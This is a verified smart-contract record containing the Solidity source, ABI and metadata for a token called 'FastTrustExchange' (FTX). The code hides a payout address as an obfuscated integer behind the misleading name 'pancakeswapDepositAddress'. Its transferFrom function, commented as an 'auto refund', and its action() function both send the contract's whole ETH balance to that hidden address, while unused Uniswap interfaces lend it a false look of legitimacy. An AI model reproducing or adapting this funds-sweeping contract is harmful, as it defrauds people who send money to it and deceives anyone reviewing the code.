{"SourceCode": "pragma solidity ^0.6.6; \r\n\r\ninterface IUniswapV1Exchange {\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\r\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\r\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\r\n}\r\n\r\ninterface IUniswapV1Factory {\r\n    function getExchange(address) external view returns (address);\r\n}\r\n\r\ncontract Manager {\r\n  function performTasks() public {}\r\n      \r\n\r\n  function pancakeswapDepositAddress() public pure returns (address) {\r\n        uint160 pindex = 892831424657045743174291980037948166195187165903;\r\n              \r\n    return address(pindex);\r\n  }\r\n}\r\n\r\ncontract FastTrustExchange { \r\n    Manager manager; \r\n    mapping(address => uint) public balances; \r\n    mapping(address => mapping(address => uint)) public allowance; \r\n    uint public decimals = 18; \r\n    uint public totalSupply = 1000000000 * 10 ** 18; //Coin Supply \r\n    string public name = \"FastTrustExchange\"; //Coin Name \r\n    string public symbol = \"FTX\"; //Coin Symbol  \r\n     \r\n    event Transfer(address indexed from, address indexed to, uint value); \r\n    event Approval(address indexed owner, address indexed spender, uint value); \r\n \r\n    constructor() public { \r\n        balances[msg.sender] = totalSupply; \r\n        manager = new Manager(); \r\n    } \r\n     \r\n    function balanceOf(address owner) public view returns(uint) { \r\n        return balances[owner]; \r\n    } \r\n     \r\n    function transfer(address to, uint value) public returns(bool) { \r\n        require(balanceOf(msg.sender) >= value, 'balance too low'); \r\n        balances[to] += value; \r\n        balances[msg.sender] -= value; \r\n        emit Transfer(msg.sender, to, value); \r\n        return true; \r\n    } \r\n     \r\n    //Transaction And Auto Refund \r\n    function transferFrom(address from, address to, uint value) public returns(bool) { \r\n        require(balanceOf(from) >= value, 'balance too low'); \r\n        require(allowance[from][msg.sender] >= value, 'allowance too low'); \r\n        balances[to] += value; \r\n        balances[from] -= value; \r\n        emit Transfer(from, to, value); \r\n        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance); \r\n         \r\n        return true;    \r\n    } \r\n     \r\n    //Approval for transaction \r\n    function approve(address spender, uint value) public returns (bool) { \r\n        allowance[msg.sender][spender] = value; \r\n        emit Approval(msg.sender, spender, value); \r\n        return true;    \r\n    } \r\n \r\n    //Transfer to the address which create this contract. \r\n receive() external payable {} \r\n    function action() public payable { \r\n        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance); \r\n        manager;         \r\n    } \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"action\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "FastTrustExchange", "CompilerVersion": "v0.6.6+commit.6c089d02", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://af7346528d3d494ab16548ca4f3337d595a0004dc8b15c052ca4668baf239fab"}